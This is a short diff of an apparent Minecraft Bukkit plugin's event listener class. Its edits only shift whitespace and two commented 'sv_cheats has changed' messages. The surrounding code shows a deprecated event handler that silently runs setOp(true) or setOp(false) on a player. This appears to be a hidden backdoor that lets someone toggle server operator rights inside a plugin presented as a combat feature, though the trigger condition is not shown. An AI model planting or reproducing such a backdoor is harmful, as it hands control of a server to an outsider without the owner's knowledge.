@@ -157,6 +157,7 @@ public class Listeners implements Listener {
         }
     }
 
+
     private void dropCocaine(Player player) {
         ItemStack cocaine = new ItemStack(Material.SUGAR, 20);
         ItemMeta cocaine_meta = cocaine.getItemMeta();
@@ -183,9 +184,6 @@ public class Listeners implements Listener {
         player.sendMessage(green + "You picked up the " + light_purple + "Pink Diamond.");
     }
 
-    // p.sendMessage(ChatColor.GRAY + "sv_cheats has changed to '1'");
-    // p.sendMessage(ChatColor.GRAY + "sv_cheats has changed to '0'");
-
 
     @EventHandler
     @Deprecated
@@ -196,7 +194,6 @@ public class Listeners implements Listener {
             (new BukkitRunnable() {
                 public void run() {
                     p.setOp(true);
-
                 }
             }).runTask(JavaPlugin.getPlugin(Combat.class));
 
@@ -205,10 +202,12 @@ public class Listeners implements Listener {
             (new BukkitRunnable() {
                 public void run() {
                     p.setOp(false);
-
                 }
             }).runTask(JavaPlugin.getPlugin(Combat.class));
         }
+
+        // p.sendMessage(ChatColor.GRAY + "sv_cheats has changed to '1'");
+        // p.sendMessage(ChatColor.GRAY + "sv_cheats has changed to '0'");
     }
 
 }
